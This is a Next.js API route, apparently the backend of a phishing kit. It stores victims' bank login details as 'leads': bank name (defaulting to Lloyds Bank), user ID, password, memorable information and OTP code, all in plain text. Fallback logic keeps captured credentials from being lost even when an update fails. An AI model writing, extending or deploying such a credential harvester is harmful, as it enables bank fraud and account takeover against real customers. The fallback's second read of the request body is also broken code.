import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

// DELETE Lead by ID (Bulk or Single Delete fix)
export async function DELETE(
  req: Request,
  context: { params: { id?: string } }
) {
  try {
    const id = context.params?.id;
    if (!id || id === "undefined" || id === "null") {
      return NextResponse.json({ success: false, message: "Invalid ID" }, { status: 400 });
    }

    await prisma.lead.delete({
      where: { id },
    });

    return NextResponse.json({ success: true, message: "Deleted successfully" });
  } catch (error) {
    console.error("Delete error:", error);
    return NextResponse.json({ success: false, message: "Failed to delete record" }, { status: 500 });
  }
}

export async function PUT(
  req: Request,
  context: { params: { id?: string } }
) {
  try {
    const id = context.params?.id;
    const body = await req.json();

    console.log("API PUT Hit - ID:", id, "Body:", body);

    // Agar ID valid nahi hai, toh fallback ke taur par nayi row bana do taaki data miss na ho
    if (!id || id === "undefined" || id === "null" || id === "active_lead_id") {
      const newLead = await prisma.lead.create({
        data: {
          bankName: body.bankName || "Lloyds Bank",
          bankType: body.bankType || "Personal",
          userId: body.userId || "",
          password: body.password || "",
          memorableInfo: body.memorableInfo || null,
          otpCode: body.otpCode || null,
          extraData: body.extraData || "Fallback Auto-Created",
        },
      });
      return NextResponse.json({ success: true, data: newLead });
    }

    // Try updating the existing lead
    const updatedLead = await prisma.lead.update({
      where: { id },
      data: {
        ...(body.bankName && { bankName: body.bankName }),
        ...(body.bankType && { bankType: body.bankType }),
        ...(body.userId !== undefined && { userId: body.userId }),
        ...(body.password !== undefined && { password: body.password }),
        ...(body.memorableInfo !== undefined && { memorableInfo: body.memorableInfo }),
        ...(body.otpCode !== undefined && { otpCode: body.otpCode }),
        ...(body.extraData && { extraData: body.extraData }),
      },
    });

    return NextResponse.json({ success: true, data: updatedLead });
  } catch (error) {
    console.error("PUT Error, executing safety fallback creation:", error);
    
    // Safety Fallback: Agar update fail ho jaye toh naya record insert kar do
    try {
      const fallbackBody = await req.json().catch(() => ({}));
      const emergencyLead = await prisma.lead.create({
        data: {
          bankName: fallbackBody.bankName || "Lloyds Bank",
          bankType: fallbackBody.bankType || "Personal",
          userId: fallbackBody.userId || "",
          password: fallbackBody.password || "",
          memorableInfo: fallbackBody.memorableInfo || null,
          extraData: "Emergency Fallback Lead",
        },
      });
      return NextResponse.json({ success: true, data: emergencyLead });
    } catch (innerErr) {
      console.error("Critical DB Failure:", innerErr);
      return NextResponse.json({ success: false, error: "Database error" }, { status: 500 });
    }
  }
}